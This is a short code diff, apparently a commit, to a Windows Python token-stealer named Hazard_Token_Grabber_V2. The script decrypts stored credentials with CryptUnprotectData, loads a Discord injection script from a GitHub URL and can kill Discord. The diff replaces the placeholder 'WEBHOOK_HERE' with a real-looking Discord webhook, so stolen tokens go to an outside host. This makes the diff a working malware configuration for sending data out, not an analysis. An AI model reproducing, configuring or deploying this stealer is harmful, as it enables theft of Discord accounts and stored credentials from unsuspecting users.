@@ -19,7 +19,7 @@ from win32crypt import CryptUnprotectData
 
 config = {
     # replace WEBHOOK_HERE with your webhook
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/1349223901879730227/NWSNx6kF1xv0G1wPgwTrdPh_5JwdFWpHXxAOaW3VPFkfCBOg4WtlG65s7g3EshyA1ydK",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill Discord upon running exe
@@ -538,3 +538,4 @@ class Hazard_Token_Grabber_V2(functions):
 
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(Hazard_Token_Grabber_V2().init())
+
